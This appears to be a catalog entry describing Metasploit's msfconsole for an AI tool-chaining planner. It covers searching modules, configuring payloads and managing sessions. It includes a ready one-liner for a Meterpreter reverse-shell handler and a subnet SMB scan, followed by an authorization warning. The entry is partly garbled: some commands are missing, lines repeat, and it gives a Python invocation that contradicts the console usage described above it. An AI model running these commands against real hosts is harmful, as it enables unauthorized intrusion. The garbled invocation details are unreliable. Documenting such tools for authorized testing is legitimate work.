name: msfconsole
title: Metasploit Framework Console
description: The primary interactive command-line interface for the Metasploit Framework. It provides a centralized console to manage database integrations, search for security vulnerabilities/exploits, configure payloads, launch auxiliary network scanners, and interact with active post-exploitation sessions (e.g. Meterpreter).
what_for: Vulnerability scanning and network service enumeration using auxiliary modules.
Exploiting security vulnerabilities in remote hosts using exploit modules.
Setting up local listener interfaces (handlers) to catch incoming reverse connections.
Conducting post-exploitation tasks, running post-exploitation modules, and executing commands on compromised targets.

how_to_use_workflow.name: Initialize the Database (Optional but Recommended)
how_to_use_workflow.description: Initializes and starts the local PostgreSQL database to speed up module searches and log host/service/vulnerability status.

how_to_use_workflow.name: Launch the Console
how_to_use_workflow.description: Launches the Metasploit console. The '-q' flag is commonly used to suppress the startup banner and speed up loading.

how_to_use_workflow.name: Search for Modules
how_to_use_workflow.description: Searches the framework for modules matching keywords, CVE IDs (e.g. 'cve:2017-0144'), platform, or type.

how_to_use_workflow.name: Select and Activate a Module
how_to_use_workflow.description: Loads the selected module into the active console context.

how_to_use_workflow.name: Configure Module Parameters
how_to_use_workflow.description: Displays required and optional settings. Use 'set RHOSTS <IP>' to define the target and 'set LHOST <IP>' to specify your local interface.

how_to_use_workflow.name: Configure the Payload
how_to_use_workflow.description: Sets the payload that will execute on the target host once exploitation succeeds.

how_to_use_workflow.name: Execute/Exploit
how_to_use_workflow.description: Launches the attack. Can be run with '-j' to execute as a background job.

how_to_use_workflow.name: Manage Sessions
how_to_use_workflow.description: Lists active sessions ('sessions') and interacts with a specific active session.

cli_arguments.description: Do not print the banner on startup.
Execute specified console commands directly from the shell (multiple commands separated by semicolons).
Run the specified resource file containing a list of console commands (similar to a script).
Output console logs and command outputs to the specified file.

interactive_commands.description: Search for exploits, auxiliary scanners, or post modules.
Load a module by path or index.
Display detailed documentation, authors, CVE info, and settings for the active module.

interactive_commands.command: show options / show payloads / show targets
interactive_commands.description: Display relevant module settings, compatible payloads, or target operating system types.
Set options locally for the active module or globally for all modules.
Run the active exploit or auxiliary scanner.
Move out of the active module context back to the general prompt.
List active connections, or interact with a compromised system session.
List background tasks (e.g. running listeners), or terminate a specific job.

examples.description: Setting up a multi/handler listener to receive an incoming reverse shell session
examples.command: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; set ExitOnSession false; exploit -j"

examples.description: Scanning a network subnet for open SMB shares non-interactively using an auxiliary scanner
examples.command: msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.56.0/24; set THREADS 16; run; exit"

examples.description: Executing an exploit using a local resource script to automate setup

risk.warning: Executing exploit modules can cause service disruptions (DoS), crash operating systems, trigger firewalls/EDRs, and execute arbitrary code on targets. Autonomous execution is disallowed. Always obtain prior authorization and verify host ranges.

use_cases: Use as a candidate tool in the chain planner; review provenance before use.
Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.
Use as a candidate tool in the chain planner; review provenance before use.

Use as a candidate tool in the chain planner; review provenance before use.
Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool.

documentation.how_to_use: Run the primary entrypoint as shown in upstream docs, e.g. `cd toolboxes/msfconsole && python3 msfconsole.py --target $KFIOSA_TARGET_HOST`. Further invocations from upstream: `cd toolboxes/msfconsole && python3 msfconsole.py --help`; `cd toolboxes/msfconsole && python3 msfconsole.py --help`.
